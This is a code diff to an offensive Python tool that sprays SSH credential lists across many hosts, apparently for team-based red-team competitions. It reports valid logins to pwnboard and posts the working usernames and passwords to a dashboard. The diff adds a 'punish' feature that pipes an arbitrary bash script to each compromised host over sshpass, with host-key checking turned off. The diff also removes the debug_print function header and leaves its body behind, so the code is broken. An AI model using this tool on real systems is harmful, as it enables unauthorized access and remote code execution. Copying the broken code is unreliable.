@@ -21,19 +21,28 @@ def parse_arguments():
                         help="Path to the file containing credentials in 'username:password' format.")
     parser.add_argument("--demo", action="store_true",
                         help="Enable demo mode to simulate SSH checks without actual connection attempts. Used for checking pwnboard/webapp")
-    parser.add_argument("--dashboard_url", type=str, required=True,
-                        help="URL to the Flask web application for posting valid credentials.")
+    parser.add_argument("--dashboard_url", type=str, required=True, default="https://127.0.0.1:5000",
+                        help="URL to the Flask web application for posting valid credentials., Default is 127.0.0.1:5000")
     parser.add_argument("--debug", action="store_true",
                         help="Enable debug messages.")
     parser.add_argument("--use_proxychains", action="store_true",
                         help="Use proxychains for SSH attempts. Default is False.")
+    parser.add_argument("--punish", type=str, help="Path to the bash script to execute on successful SSH. Default is None.", default=None)
+
+    epilog_text = ("Examples of use:\n\n"
+                   "  Run in single mode for team 5: \n"
+                   "    python script_name.py -m single -t 5 -f ips.txt -c creds.txt --dashboard_url http://dashboard.url\n\n"
+                   "  Run across multiple teams in host_across_teams mode: \n"
+                   "    python script_name.py -m host_across_teams -n 10 -f ips.txt -c creds.txt --dashboard_url http://dashboard.url\n")
+    parser.epilog = epilog_text
+
     return parser.parse_args()
 
-def debug_print(*args, **kwargs):
+
     if globals().get("DEBUG_MODE", False):
         print(*args, **kwargs)
 
-def ssh_attempt(ip, user, password, pwn_host, dashboard_url, team, demo=False, use_proxychains=False):
+def ssh_attempt(ip, user, password, pwn_host, dashboard_url, team, demo=False, use_proxychains=False, punish_script=None):
     try:
         if demo:
             debug_print(f"Demo mode: ✅  {ip} - {user}")
@@ -45,12 +54,17 @@ def ssh_attempt(ip, user, password, pwn_host, dashboard_url, team, demo=False, u
                 ssh_command = ["proxychains", *ssh_command]
             result = subprocess.run(ssh_command, capture_output=True)
             result_code = result.returncode
-            print(result.stderr.decode())
+            debug_print(result.stderr.decode())
 
         if result_code == 0:
             debug_print(f"✅  {ip} - {user} with {password}")
             pwboard_callback(ip, pwn_host)
             post_to_webapp(ip, user, password, dashboard_url, team)
+            if punish_script:
+                punish_command = ["sshpass", "-p", password, "ssh", "-o", "ConnectTimeout=1", "-o", "UserKnownHostsFile=/dev/null", "-o", "StrictHostKeyChecking=no", f"{user}@{ip}", f"bash -s < {punish_script}"]
+                if use_proxychains:
+                    punish_command = ["proxychains", *punish_command]
+                subprocess.run(punish_command, capture_output=True)
     except Exception as e:
         debug_print(f"Error in ssh_attempt for {ip}: {e}")
 
@@ -95,7 +109,7 @@ def run_checks_for_team(ip_templates, team_number, credentials, args):
     try:
         ips = [replace_ip_placeholder(ip_template, team_number) for ip_template in ip_templates]
         with concurrent.futures.ThreadPoolExecutor() as executor:
-            futures = [executor.submit(ssh_attempt, ip, user, password, args.pwnboard_host, args.dashboard_url, team_number, args.demo, args.use_proxychains) for ip in ips for user, password in credentials]
+            futures = [executor.submit(ssh_attempt, ip, user, password, args.pwnboard_host, args.dashboard_url, team_number, args.demo, args.use_proxychains, args.punish) for ip in ips for user, password in credentials]
             concurrent.futures.wait(futures)
     except Exception as e:
         debug_print(f"Error in run_checks_for_team for team {team_number}: {e}")
